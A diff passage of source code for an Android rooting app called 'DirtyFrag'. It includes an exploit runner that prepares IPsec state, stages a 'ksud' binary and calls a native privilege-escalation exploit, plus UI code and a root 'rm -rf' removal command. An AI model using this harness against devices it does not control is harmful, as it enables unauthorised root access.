+    private static final float[] POSITIONS = {0f, 0.32f, 0.60f, 0.82f, 1f};
+
+    public BottomFadeView(Context context) {
+        super(context);
+    }
+
+    public BottomFadeView(Context context, AttributeSet attrs) {
+        super(context, attrs);
+    }
+
+    public BottomFadeView(Context context, AttributeSet attrs, int defStyleAttr) {
+        super(context, attrs, defStyleAttr);
+    }
+
+    @Override
+    protected void onSizeChanged(int w, int h, int oldW, int oldH) {
+        super.onSizeChanged(w, h, oldW, oldH);
+        paint.setShader(new LinearGradient(0, 0, 0, h, COLORS, POSITIONS, Shader.TileMode.CLAMP));
+    }
+
+    @Override
+    protected void onDraw(Canvas canvas) {
+        super.onDraw(canvas);
+        canvas.drawRect(0, 0, getWidth(), getHeight(), paint);
+    }
+}
+
+============================================================
+
+FILE: ./app/src/main/java/df/root/ExploitRunner.java
+============================================================
+package df.root;
+
+import android.content.Context;
+import android.net.IpSecAlgorithm;
+import android.net.IpSecManager;
+import android.net.IpSecTransform;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.DatagramSocket;
+import java.net.InetAddress;
+import java.security.SecureRandom;
+
+public class ExploitRunner {
+
+    static { System.loadLibrary("exp"); }
+
+    static native int nativeRunAll(IReporter reporter, String koTarget, int encapPort, int spi,
+                                    byte[] aesCbcKey, byte[] hmacKey, int icvLen,
+                                    int senderPort, boolean softReboot);
+
+    public static int run(Context ctx, IReporter reporter, boolean softReboot) throws Exception {
+        String koTarget = detectKoTarget(reporter);
+
+        reporter.report("=== setup ===\n");
+        IpSecManager ipsec = (IpSecManager) ctx.getSystemService(Context.IPSEC_SERVICE);
+        if (ipsec == null) throw new IllegalStateException("IpSecManager unavailable (requires API 28+)");
+
+        IpSecManager.UdpEncapsulationSocket encapSock = ipsec.openUdpEncapsulationSocket();
+        int encapPort = encapSock.getPort();
+        reporter.report("encap port: " + encapPort + "\n");
+
+        InetAddress loopback = InetAddress.getByName("127.0.0.1");
+        IpSecManager.SecurityParameterIndex spiObj =
+                ipsec.allocateSecurityParameterIndex(loopback);
+        int spiVal = spiObj.getSpi();
+        reporter.report("spi: 0x" + Integer.toHexString(spiVal) + "\n");
+
+        SecureRandom rng = new SecureRandom();
+        byte[] aesKey  = new byte[32]; rng.nextBytes(aesKey);
+        byte[] hmacKey = new byte[32]; rng.nextBytes(hmacKey);
+
+        int authTruncBits = 128;
+        IpSecAlgorithm enc  = new IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey);
+        IpSecAlgorithm auth = new IpSecAlgorithm(IpSecAlgorithm.AUTH_HMAC_SHA256, hmacKey, authTruncBits);
+
+        DatagramSocket senderSock = new DatagramSocket();
+        int senderPort = senderSock.getLocalPort();
+        senderSock.close();
+
+        IpSecTransform transform = new IpSecTransform.Builder(ctx)
+                .setEncryption(enc)
+                .setAuthentication(auth)
+                .setIpv4Encapsulation(encapSock, senderPort)
+                .buildTransportModeTransform(loopback, spiObj);
+
+        int rc;
+        try {
+            stageKsud(ctx, reporter);
+            reporter.report("\n");
+            reporter.report("=== exploit ===\n");
+            rc = nativeRunAll(reporter, koTarget, encapPort, spiVal, aesKey, hmacKey, authTruncBits / 8, senderPort, softReboot);
+        } finally {
+            transform.close();
+            spiObj.close();
+            encapSock.close();
+        }
+
+        return rc;
+    }
+
+    public static String detectKoTarget(IReporter reporter) {
+        String[] candidates = {
+            "/vendor/lib64/libbinderdebug.so",
+            "/vendor/lib64/libstagefrighthw.so",
+            "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
+        };
+        for (String path : candidates) {
+            if (new File(path).exists()) {
+                reporter.report("found ko_target: " + path + "\n");
+                return path;
+            }
+            reporter.report(path + " not found\n");
+        }
+        reporter.report("Could not find vendor_file target, falling back to libbinderdebug.so\n");
+        return candidates[0];
+    }
+
+    public static void stageKsud(Context ctx, IReporter reporter) throws IOException {
+        File dest = new File(ctx.createDeviceProtectedStorageContext().getFilesDir().getParentFile(), "ksud");
+        File tmp = new File(dest.getPath() + ".tmp");
+        try (InputStream in = ctx.getAssets().open("ksud");
+             OutputStream out = new FileOutputStream(tmp)) {
+            byte[] buf = new byte[8192];
+            for (int n; (n = in.read(buf)) != -1; ) out.write(buf, 0, n);
+        } catch (IOException e) {
+            tmp.delete();
+            throw e;
+        }
+        if (!tmp.renameTo(dest)) { tmp.delete(); throw new IOException("rename failed: " + dest); }
+        if (!dest.setExecutable(true, false))
+            throw new IOException("setExecutable failed: " + dest.getAbsolutePath());
+        reporter.report("ksud staged to: " + dest.getAbsolutePath() + "\n");
+    }
+}
+
+============================================================
+
+FILE: ./app/src/main/java/df/root/IReporter.java
+============================================================
+package df.root;
+
+public interface IReporter {
+    void report(String msg);
+}
+
+============================================================
+
+FILE: ./app/src/main/java/df/root/MainActivity.java
+============================================================
+package df.root;
+
+import android.content.Context;
+import android.content.ComponentName;
+import android.content.ContentValues;
+import android.content.Intent;
+import android.content.res.ColorStateList;
+import android.content.pm.PackageManager;
+import android.graphics.Typeface;
+import android.net.Uri;
+import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
+import android.provider.MediaStore;
+import android.text.SpannableString;
+import android.text.style.ForegroundColorSpan;
+import android.text.style.RelativeSizeSpan;
+import android.text.style.StyleSpan;
+import android.util.Log;
+import android.view.HapticFeedbackConstants;
+import android.view.MotionEvent;
+import android.view.View;
+import android.widget.TextView;
+import android.widget.Toast;
+import androidx.core.content.res.ResourcesCompat;
+
+import androidx.appcompat.app.AppCompatActivity;
+
+import df.root.databinding.ActivityMainBinding;
+
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.util.concurrent.Executor;
+import java.util.concurrent.Executors;
+
+public class MainActivity extends AppCompatActivity implements IReporter {
+
+    private static final String TAG = "dfroot";
+
+    private ActivityMainBinding binding;
+    private final Handler mMain = new Handler(Looper.getMainLooper());
+    private final Executor mExec = Executors.newSingleThreadExecutor();
+    private final StringBuilder logBuffer = new StringBuilder();
+    private File lastLogFile;
+    private boolean running;
+    private boolean runArmed;
+    private boolean advancedLog;
+    private boolean expertMode;
+    private String exploitPhase = "";
+    private int cleanupSteps;
+    private float seg1;
+    private float pillPercent = 0.48f;
+    private VersionPillSpan pillSpan;
+    private TextView titleView;
+    private boolean updateAvailable;
+    private boolean moduleRefresh;
+
+    @Override
+    public void report(String msg) {
+        Log.i(TAG, msg.trim());
+        mMain.post(() -> {
+            // Drive the two-step progress bar from the raw (unfiltered) lines.
+            for (String line : msg.split("\n", -1)) {
+                driveProgress(line.trim());
+            }
+            for (String line : msg.split("\n", -1)) {
+                String t = line.trim();
+                // Skip empty lines to keep the log compact.
+                if (t.isEmpty()) {
+                    continue;
+                }
+                // Drop byte-progress counters ("0 ?", "512 ?", ...).
+                if (t.matches("\\d+\\s*(\\u2026|\\.{3})?")) {
+                    continue;
+                }
+                // Drop internal patch/hook details and result headers.
+                if (t.contains("hook=") || t.matches("\\*+SUCCESS\\*+")
+                        || t.contains("exploit success")) {
+                    continue;
+                }
+                // Strip hex file offsets: ".../libc.so+0x6e8b0" -> ".../libc.so"
+                t = t.replaceAll("\\+0x[0-9a-fA-F]+$", "");
+                t = stripHeader(t);
+                appendLog(t);
+            }
+            binding.outputScroll.post(() -> binding.outputScroll.fullScroll(View.FOCUS_DOWN));
+        });
+    }
+
+    private void appendLog(String line) {
+        binding.outputView.append(styleLogLine(line));
+        binding.outputView.append("\n");
+        logBuffer.append(line).append('\n');
+        saveLog();
+    }
+
+    /** Translates raw native log lines into two-step progress-bar states. */
+    private void driveProgress(String t) {
+        if (t.isEmpty()) return;
+        switch (t) {
+            case "=== setup ===":
+                exploitPhase = "setup";
+                setSeg1(0.05f);
+                break;
+            case "=== exploit ===":
+                exploitPhase = "exploit";
+                setSeg1(0.15f);
+                break;
+            case "=== cleanup ===":
+                exploitPhase = "cleanup";
+                cleanupSteps = 0;
+                setSeg1(1f);
+                setSeg2(0.05f, "Verification", 0xFFFFFFFF);
+                break;
+            default:
+                break;
+        }
+        if (exploitPhase.equals("setup") && t.startsWith("ksud staged")) {
+            setSeg1(0.10f);
+        }
+        if (exploitPhase.equals("exploit") && t.startsWith("patched")) {
+            if (t.contains("crash_dump64")) {
+                setSeg1(0.30f);
+            } else if (t.contains("libbinderdebug")) {
+                setSeg1(0.55f);
+            } else if (t.contains("libc++.so")) {
+                setSeg1(Math.min(0.80f, seg1 + 0.05f));
+            }
+        }
+        if (t.startsWith("* triggering")) {
+            setSeg1(0.85f);
+        }
+        if (t.startsWith("libc++: mutex acquired")) {
+            setSeg1(0.95f);
+        }
+        if (exploitPhase.equals("cleanup")
+                && (t.startsWith("* restore") || t.startsWith("* cache dropped"))) {
+            cleanupSteps++;
+            setSeg2(Math.min(1f, cleanupSteps / 3f), "Verification", 0xFFFFFFFF);
+        }
+    }
+
+    private void setSeg1(float p) {
+        seg1 = p;
+        binding.twoStep.setSeg1(p, Math.round(p * 100) + "%");
+    }
+
+    private void setSeg2(float p, String label, int color) {
+        binding.twoStep.setSeg2(p, label, color);
+    }
+
+    /** Visibility of log / share button / progress bar, composed from the
+     *  advanced-log setting and whether any run data exists. */
+    private void updateLogVisibility() {
+        boolean hasRun = logBuffer.length() > 0
+                || (lastLogFile != null && lastLogFile.exists());
+        boolean showLog = advancedLog && hasRun;
+        binding.outputScroll.setVisibility(showLog ? View.VISIBLE : View.GONE);
+        binding.btnShareLog.setVisibility(showLog ? View.VISIBLE : View.GONE);
+        // Progress bar is the simple status: always visible.
+    }
+
+    /** "=== setup ===" -> "SETUP"; "=== exploit failed: x ===" -> "EXPLOIT FAILED: X". */
+    private static String stripHeader(String t) {
+        java.util.regex.Matcher m = java.util.regex.Pattern
+                .compile("^===\\s*(.*?)\\s*===$").matcher(t);
+        return m.matches() ? m.group(1).toUpperCase() : t;
+    }
+
+    /** Short firmware token from the build display string, e.g. "S931BXXU1AYB2"
+     *  - everything that is not the model-prefixed version is dropped. */
+    private static String fwToken() {
+        String d = android.os.Build.DISPLAY;
+        String model = android.os.Build.MODEL == null
+                ? "" : android.os.Build.MODEL.replace("SM-", "").trim();
+        if (d == null || d.trim().isEmpty()) return "UNKNOWN";
+        if (model.isEmpty()) return d.trim();
+        java.util.regex.Matcher m = java.util.regex.Pattern
+                .compile("[A-Z0-9]*" + java.util.regex.Pattern.quote(model) + "[A-Z0-9]*")
+                .matcher(d);
+        return m.find() ? m.group() : d.trim();
+    }
+
+    /** Header lines render big, white and bold; the rest is dimmed. */
+    private boolean isHeader(String line) {
+        return line.equals("SETUP") || line.equals("EXPLOIT") || line.equals("CLEANUP")
+                || line.startsWith("EXPLOIT FAILED")
+                || line.equals(fwToken());
+    }
+
+    /** Header lines render big, white and bold; the rest is dimmed. */
+    private CharSequence styleLogLine(String line) {
+        SpannableString ss = new SpannableString(line);
+        if (isHeader(line)) {
+            ss.setSpan(new StyleSpan(Typeface.BOLD), 0, line.length(), 0);
+            ss.setSpan(new RelativeSizeSpan(1.3f), 0, line.length(), 0);
+            ss.setSpan(new ForegroundColorSpan(0xFFFFFFFF), 0, line.length(), 0);
+        } else {
+            ss.setSpan(new ForegroundColorSpan(0xFFB3B3B3), 0, line.length(), 0);
+        }
+        return ss;
+    }
+
+    private void saveLog() {
+        try (FileOutputStream out = new FileOutputStream(lastLogFile)) {
+            out.write(logBuffer.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8));
+        } catch (IOException ignored) {
+        }
+        // Remember which boot this log came from - it is invalidated on reboot.
+        createDeviceProtectedStorageContext()
+                .getSharedPreferences("dfroot", MODE_PRIVATE)
+                .edit().putInt("log_boot_count", bootCount()).apply();
+    }
+
+    private int bootCount() {
+        try {
+            return android.provider.Settings.Global.getInt(getContentResolver(),
+                    android.provider.Settings.Global.BOOT_COUNT, -1);
+        } catch (Exception e) {
+            return -1;
+        }
+    }
+
+    private String readLastLog() {
+        if (lastLogFile == null || !lastLogFile.exists()) return "";
+        try (java.io.FileInputStream in = new java.io.FileInputStream(lastLogFile);
+             java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream()) {
+            byte[] buf = new byte[8192];
+            for (int n; (n = in.read(buf)) != -1; ) bos.write(buf, 0, n);
+            String log = bos.toString(java.nio.charset.StandardCharsets.UTF_8.name()).trim();
+            // Normalize exploit-result headers to lowercase (older runs saved
+            // them uppercase); the file gets rewritten on next save.
+            java.util.regex.Matcher m = java.util.regex.Pattern
+                    .compile("(===\\s*exploit\\s+(?:success|failed[^=]*)\\s*===)",
+                            java.util.regex.Pattern.CASE_INSENSITIVE)
+                    .matcher(log);
+            StringBuilder sb = new StringBuilder();
+            while (m.find()) m.appendReplacement(sb, java.util.regex.Matcher
+                    .quoteReplacement(m.group().toLowerCase()));
+            m.appendTail(sb);
+            return sb.toString();
+        } catch (IOException e) {
+            return "";
+        }
+    }
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        binding = ActivityMainBinding.inflate(getLayoutInflater());
+        setContentView(binding.getRoot());
+
+        // Version tag flowing right after the header title.
+        SpannableString title = new SpannableString("DirtyFrag 1.08");
+        pillSpan = new VersionPillSpan(0.45f);
+        title.setSpan(pillSpan, 10, title.length(),
+                SpannableString.SPAN_EXCLUSIVE_EXCLUSIVE);
+        binding.toolbar.setTitle(title);
+        // NOTE: no setSupportActionBar() - it makes the ActionBar delegate draw
+        // the title and ignore the toolbar's titleTextAppearance (breaks bold).
+        // The toolbar renders its own title via app:titleTextAppearance.
+
+        // Update check (SamSU-style): the pill around the version turns green
+        // when GitHub has a newer release; tapping the title opens the releases
+        // page (only while an update is flagged, so it stays a no-op otherwise).
+        mExec.execute(this::checkForAppUpdate);
+
+        // D2 vault status (Samsung VaultKeeper): Odin flashing allowed or
+        // locked. Read-only; non-Samsung devices show "not available".
+
+        // KSU modules toggle: marks every installed module disabled/enabled
+        // (diabl0w ksud convention: per-module `disable` flag files, honored
+        // at next boot). State is read back from the device via su.
+        binding.switchModules.setOnCheckedChangeListener((btn, on) -> {
+            if (moduleRefresh) return;
+            btn.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP);
+            applyModuleState(on);
+        });
+        mExec.execute(this::refreshModuleState);
+
+        // Force real bold (wght 700) One UI Sans on the toolbar title TextView.
+        binding.toolbar.post(() -> {
+            Typeface base = ResourcesCompat.getFont(this, R.font.inter_vf);
+            if (base == null) return;
+            Typeface bold = Typeface.create(base, 700, false);
+            for (int i = 0; i < binding.toolbar.getChildCount(); i++) {
+                View child = binding.toolbar.getChildAt(i);
+                if (child instanceof TextView) {
+                    titleView = (TextView) child;
+                    titleView.setTypeface(bold);
+                    titleView.setOnClickListener(v -> {
+                        if (updateAvailable) openUrl(
+                                "https://github.com/mitschud/DirtyFrag/releases");
+                    });
+                }
+            }
+        });
+
+        if (new File("/dev/df").exists()) {
+            setRootedState();
+        }
+
+        // Show the log from the last run, if any. No run yet -> log hidden.
+        // A log saved before the current boot is stale: delete it so a reboot
+        // always starts with a clean screen (log + share icon hidden).
+        lastLogFile = new File(createDeviceProtectedStorageContext().getFilesDir(), "last_run.log");
+        int savedBoot = createDeviceProtectedStorageContext()
+                .getSharedPreferences("dfroot", MODE_PRIVATE).getInt("log_boot_count", -1);
+        if (lastLogFile.exists() && savedBoot != bootCount()) {
+            lastLogFile.delete();
+            createDeviceProtectedStorageContext()
+                    .getSharedPreferences("dfroot", MODE_PRIVATE)
+                    .edit().putBoolean("last_run_success", false).apply();
+        }
+        String last = readLastLog();
+        boolean hasLastLog = !last.isEmpty();
+        if (hasLastLog) {
+            appendLog(fwToken());
+            for (String l : last.split("\n")) {
+                String t = stripHeader(l.trim());
+                // Skip stale headers, old result lines and duplicate fw lines.
+                if (t.isEmpty()
+                        || t.equals("LAST RUN")
+                        || t.equals("EXPLOIT SUCCESS")
+                        || t.equals(fwToken())) {
+                    continue;
+                }
+                appendLog(t);
+            }
+        }
+
+        // Advanced log toggle: full log vs. simple status (progress bar only).
+        advancedLog = createDeviceProtectedStorageContext()
+                .getSharedPreferences("dfroot", MODE_PRIVATE)
+                .getBoolean("advanced_log", false);
+        binding.switchAdvancedLog.setChecked(advancedLog);
+        binding.switchAdvancedLog.setOnCheckedChangeListener((btn, checked) -> {
+            advancedLog = checked;
+            createDeviceProtectedStorageContext()
+                    .getSharedPreferences("dfroot", MODE_PRIVATE)
+                    .edit().putBoolean("advanced_log", checked).apply();
+            updateLogVisibility();
+        });
+        updateLogVisibility();
+
+        // Restore the simple status for the current state: rooted device or a
+        // successful last run -> 100% + Verified; failed run -> Failed.
+        boolean rootedNow = new File("/dev/df").exists();
+        boolean lastSuccess = hasLastLog
+                && createDeviceProtectedStorageContext()
+                        .getSharedPreferences("dfroot", MODE_PRIVATE)
+                        .getBoolean("last_run_success", false);
+        boolean lastFailed = hasLastLog
+                && last.toLowerCase().contains("=== exploit failed");
+        if (rootedNow || lastSuccess) {
+            binding.twoStep.setSeg1(1f, "100%");
+            binding.twoStep.setSeg2(1f, "Verified", 0xFFFFFFFF);
+        } else if (lastFailed) {
+            setFailedState();
+        }
+
+        binding.btnRun.setOnClickListener(v -> {
+            if (running) return;
+            // Two-tap confirmation: first tap arms ("Are you sure"), second runs.
+            if (!runArmed) {
+                runArmed = true;
+                v.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP);
+                binding.btnRun.setText("Are you sure");
+                return;
+            }
+            runArmed = false;
+            v.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP);
+            running = true;
+            binding.btnRun.setEnabled(false);
+            binding.btnRun.setText("Running");
+            // Same dark greyed-out styling as the Rooted state.
+            binding.btnRun.setTextColor(0xFF6E6E6E);
+            binding.btnRun.setBackgroundTintList(ColorStateList.valueOf(0xFF1F1F1F));
+            ((com.google.android.material.button.MaterialButton) binding.btnRun)
+                    .setStrokeColor(ColorStateList.valueOf(0xFF1F1F1F));
+            binding.outputView.setText("");
+            logBuffer.setLength(0);
+            if (lastLogFile.exists()) lastLogFile.delete();
+            createDeviceProtectedStorageContext()
+                    .getSharedPreferences("dfroot", MODE_PRIVATE)
+                    .edit().putBoolean("last_run_success", false).apply();
+            appendLog(fwToken());
+            binding.twoStep.reset();
+            setCompactButton(true, false);
+            updateLogVisibility();
+            mExec.execute(() -> runExploit(false));
+        });
+
+        binding.btnKsu.setOnClickListener(v -> {
+            v.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP);
+            openKsu();
+        });
+
+        // Subtle push-in + keyboard-tap haptic on the run button.
+        binding.btnRun.setOnTouchListener((v, ev) -> {
+            switch (ev.getActionMasked()) {
+                case MotionEvent.ACTION_DOWN:
+                    v.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP);
+                    v.animate().scaleX(0.96f).scaleY(0.96f).setDuration(80).start();
+                    break;
+                case MotionEvent.ACTION_UP:
+                case MotionEvent.ACTION_CANCEL:
+                    v.animate().scaleX(1f).scaleY(1f).setDuration(120).start();
+                    break;
+                default:
+                    break;
+            }
+            return false;
+        });
+
+        binding.btnShareLog.setOnClickListener(v -> shareLog());
+
+        // Overflow menu on the custom grey-circle button: the popup closes
+        // ONLY on outside taps, so multi-tap actions are possible.
+        binding.btnMenu.setOnClickListener(v -> {
+            v.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP);
+            float md = getResources().getDisplayMetrics().density;
+            boolean rootedMenu = new File("/dev/df").exists();
+            final android.widget.PopupWindow[] pwRef = {null};
+
+            android.widget.LinearLayout box = new android.widget.LinearLayout(this);
+            box.setOrientation(android.widget.LinearLayout.VERTICAL);
+            box.setBackgroundResource(R.drawable.popup_bg);
+            box.setPadding(0, (int) (6 * md), 0, (int) (6 * md));
+
+            // -- Github Page row --
+            TextView ghRow = new TextView(this);
+            ghRow.setBackgroundResource(R.drawable.menu_row_highlight);
+            ghRow.setText("Github Page");
+            ghRow.setGravity(android.view.Gravity.CENTER_VERTICAL | android.view.Gravity.START);
+            ghRow.setPadding((int) (20 * md), 0, 0, 0);
+            ghRow.setTextColor(0xFFE8E8E8);
+            ghRow.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 15);
+            ghRow.setOnClickListener(v2 -> {
+                v2.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP);
+                openUrl("https://github.com/mitschud/DirtyFrag");
+            });
+            box.addView(ghRow, new android.widget.LinearLayout.LayoutParams(
+                    android.view.ViewGroup.LayoutParams.MATCH_PARENT, (int) (46 * md)));
+
+            // -- Expert Mode row: white dot appears when enabled --
+            android.widget.LinearLayout exRow = new android.widget.LinearLayout(this);
+            exRow.setGravity(android.view.Gravity.CENTER_VERTICAL | android.view.Gravity.START);
+            exRow.setPadding((int) (20 * md), 0, 0, 0);
+            TextView exText = new TextView(this);
+            exRow.setBackgroundResource(R.drawable.menu_row_highlight);
+            exText.setText("Expert Mode");
+            exText.setTextColor(0xFFE8E8E8);
+            exText.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 15);
+            exRow.addView(exText);
+            final android.view.View[] dotRef = {null};
+            android.view.View dot = new android.view.View(this);
+            dot.setBackgroundResource(R.drawable.dot_white);
+            android.widget.LinearLayout.LayoutParams dotLp =
+                    new android.widget.LinearLayout.LayoutParams(
+                            (int) (7 * md), (int) (7 * md));
+            dotLp.setMargins((int) (7 * md), 0, 0, 0);
+            dot.setVisibility(expertMode ? View.VISIBLE : View.GONE);
+            exRow.addView(dot, dotLp);
+            dotRef[0] = dot;
+            exRow.setOnClickListener(v2 -> {
+                v2.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP);
+                expertMode = !expertMode;
+                createDeviceProtectedStorageContext()
+                        .getSharedPreferences("dfroot", MODE_PRIVATE)
+                        .edit().putBoolean("expert_mode", expertMode).apply();
+                applyExpertMode();
+                if (dotRef[0] != null)
+                    dotRef[0].setVisibility(expertMode ? View.VISIBLE : View.GONE);
+            });
+            box.addView(exRow, new android.widget.LinearLayout.LayoutParams(
+                    android.view.ViewGroup.LayoutParams.MATCH_PARENT, (int) (46 * md)));
+
+            // -- Remove KSU/KSUD row: 3-tap confirm, greyed without root --
+            android.widget.LinearLayout rmCol = new android.widget.LinearLayout(this);
+            rmCol.setOrientation(android.widget.LinearLayout.VERTICAL);
+            rmCol.setGravity(android.view.Gravity.CENTER_VERTICAL | android.view.Gravity.START);
+            rmCol.setPadding((int) (20 * md), 0, (int) (20 * md), 0);
+            TextView rmTitle = new TextView(this);
+            rmCol.setBackgroundResource(R.drawable.menu_row_highlight);
+            rmTitle.setText("Remove KSU/KSUD");
+            rmTitle.setGravity(android.view.Gravity.START);
+            rmTitle.setTextColor(rootedMenu ? 0xFFE8E8E8 : 0xFF6E6E6E);
+            rmTitle.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 15);
+            rmCol.addView(rmTitle);
+            TextView rmSub = new TextView(this);
+            rmSub.setText(rootedMenu ? "Click 3 times" : "Requires root");
+            rmSub.setGravity(android.view.Gravity.START);
+            rmSub.setTextColor(rootedMenu ? 0xFF8E8E8E : 0xFF5A5A5A);
+            rmSub.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 11);
+            rmCol.addView(rmSub);
+            final int[] taps = {0};
+            rmCol.setOnClickListener(v2 -> {
+                if (!rootedMenu) return;
+                v2.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP);
+                taps[0]++;
+                if (taps[0] == 1) {
+                    rmTitle.setText("Are you sure");
+                    rmSub.setText("Click 2 times");
+                    return;
+                }
+                if (taps[0] == 2) {
+                    rmTitle.setText("One more click");
+                    rmSub.setText("Click 1 time");
+                    return;
+                }
+                if (pwRef[0] != null) pwRef[0].dismiss();
+                try {
+                    // Deliberately NOT calling `ksud uninstall`: its upstream
+                    // implementation force-flashes a stored boot image when a
+                    // backup exists and reboots the device after 5 seconds -
+                    // surprises we don't want. Explicit removals only, plus
+                    // the manager app this row promises to remove.
+                    Process p = Runtime.getRuntime().exec(new String[]{
+                            "su", "-c",
+                            "rm -rf /data/adb/ksu /data/adb/ksud"
+                                    + " /data/adb/post-fs-data.d"
+                                    + " /data/adb/modules_update"
+                                    + " /data/adb/modules /data/adb/ksu.bk"
+                                    + " /data/adb/preinit*; "
+                                    + "pm uninstall me.weishu.kernelsu; "
+                                    + "rm -f /data/user_de/0/df.root/ksud"});
+                    int rc = p.waitFor();
+                    mMain.post(() -> {
+                        Toast.makeText(MainActivity.this,
+                                rc == 0 ? "KSU/KSUD removed"
+                                        : "Removal failed (code " + rc + ")",
+                                Toast.LENGTH_SHORT).show();
+                        setRootedState(false);
+                    });
+                } catch (Exception e) {
+                    Toast.makeText(MainActivity.this,
+                            "su not available", Toast.LENGTH_SHORT).show();
+                }
+            });
+            box.addView(rmCol, new android.widget.LinearLayout.LayoutParams(
+                    android.view.ViewGroup.LayoutParams.MATCH_PARENT, (int) (58 * md)));
+
+            // Width: content, but at least 210dp so the popup reads properly.
+            box.measure(View.MeasureSpec.UNSPECIFIED, View.MeasureSpec.UNSPECIFIED);
+            int pw_w = Math.max(box.getMeasuredWidth(), (int) (190 * md));
+
+            final android.widget.PopupWindow pw = new android.widget.PopupWindow(box,
+                    pw_w, android.view.ViewGroup.LayoutParams.WRAP_CONTENT, true);
+            pw.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(
+                    android.graphics.Color.TRANSPARENT));
+            pw.setOutsideTouchable(true);
+            pwRef[0] = pw;
+            pw.setOnDismissListener(() ->
+                    binding.dimOverlay.animate().alpha(0f).setDuration(150)
+                            .withEndAction(() -> binding.dimOverlay
+                                    .setVisibility(View.GONE)).start());
+
+            // Centered separators between the rows.
+            android.widget.LinearLayout.LayoutParams sepLp =
+                    new android.widget.LinearLayout.LayoutParams(
+                            android.view.ViewGroup.LayoutParams.MATCH_PARENT, Math.max(1, (int) md));
+            sepLp.setMargins((int) (20 * md), 0, (int) (20 * md), 0);
+            android.view.View sep1 = new android.view.View(this);
+            sep1.setBackgroundColor(0xFF3F3F3F);
+            box.addView(sep1, 1, sepLp);
+            android.view.View sep2 = new android.view.View(this);
+            sep2.setBackgroundColor(0xFF3F3F3F);
+            android.widget.LinearLayout.LayoutParams sep2Lp =
+                    new android.widget.LinearLayout.LayoutParams(
+                            android.view.ViewGroup.LayoutParams.MATCH_PARENT, Math.max(1, (int) md));
+            sep2Lp.setMargins((int) (20 * md), 0, (int) (20 * md), 0);
+            box.addView(sep2, 3, sep2Lp);
+
+            box.setOutlineProvider(new android.view.ViewOutlineProvider() {
+                @Override
+                public void getOutline(View view, android.graphics.Outline outline) {
+                    outline.setRoundRect(0, 0, view.getWidth(), view.getHeight(), 26 * md);
+                }
+            });
+            box.setClipToOutline(true);
+            box.setElevation(48 * md);
+
+            int[] loc = new int[2];
+            binding.menuAnchor.getLocationOnScreen(loc);
+            int x = loc[0] + binding.menuAnchor.getWidth() - pw_w;
+            int y = loc[1] + (int) (2 * md);
+            binding.dimOverlay.setVisibility(View.VISIBLE);
+            binding.dimOverlay.setAlpha(0f);
+            binding.dimOverlay.animate().alpha(0.5f).setDuration(150).start();
+            box.setPivotX(pw_w);
+            box.setPivotY(0f);
+            box.setScaleX(0.85f);
+            box.setScaleY(0.9f);
+            box.setAlpha(0f);
+            pw.showAtLocation(binding.menuAnchor,
+                    android.view.Gravity.TOP | android.view.Gravity.START, x, y);
+            box.animate().scaleX(1f).scaleY(1f).alpha(1f).setDuration(150)
+                    .setInterpolator(new android.view.animation.DecelerateInterpolator())
+                    .start();
+        });
+        ComponentName bootReceiver = new ComponentName(this, BootReceiver.class);
+        int state = getPackageManager().getComponentEnabledSetting(bootReceiver);
+        boolean bootEnabled = state == PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
+        binding.switchBootStart.setChecked(bootEnabled);
+        binding.switchBootStart.setOnCheckedChangeListener((btn, checked) -> {
+            getPackageManager().setComponentEnabledSetting(bootReceiver,
+                checked ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED
+                        : PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
+            binding.switchAutoSoftReboot.setEnabled(checked);
+        });
+
+        boolean autoSoftReboot = createDeviceProtectedStorageContext()
+                .getSharedPreferences("dfroot", MODE_PRIVATE)
+                .getBoolean("auto_soft_reboot", false);
+        binding.switchAutoSoftReboot.setChecked(autoSoftReboot);
+        binding.switchAutoSoftReboot.setEnabled(bootEnabled);
+        binding.switchAutoSoftReboot.setOnCheckedChangeListener((btn, checked) ->
+            createDeviceProtectedStorageContext()
+                .getSharedPreferences("dfroot", MODE_PRIVATE)
+                .edit().putBoolean("auto_soft_reboot", checked).apply());
+
+        // Expert mode gates the autorun card: locked until toggled in the menu.
+        expertMode = createDeviceProtectedStorageContext()
+                .getSharedPreferences("dfroot", MODE_PRIVATE)
+                .getBoolean("expert_mode", false);
+        applyExpertMode();
+    }
+
+    /** Expert mode off: the autorun card is inaccessible - greyed text and
+     *  disabled toggles, titles suffixed with (Expert). */
+    private void applyExpertMode() {
+        boolean ok = expertMode;
+        binding.tvAutorunTitle.setText(ok ? "Autorun" : "Autorun (Expert)");
+        binding.tvRebootTitle.setText(ok ? "Auto reboot" : "Auto reboot (Expert)");
+        binding.tvAutorunTitle.setTextColor(ok ? 0xFFFFFFFF : 0xFF6E6E6E);
+        binding.tvAutorunDesc.setTextColor(ok ? 0xFF9E9E9E : 0xFF5A5A5A);
+        binding.tvRebootTitle.setTextColor(ok ? 0xFFFFFFFF : 0xFF6E6E6E);
+        binding.tvRebootDesc.setTextColor(ok ? 0xFF9E9E9E : 0xFF5A5A5A);
+        binding.switchBootStart.setEnabled(ok);
+        binding.switchAutoSoftReboot.setEnabled(ok
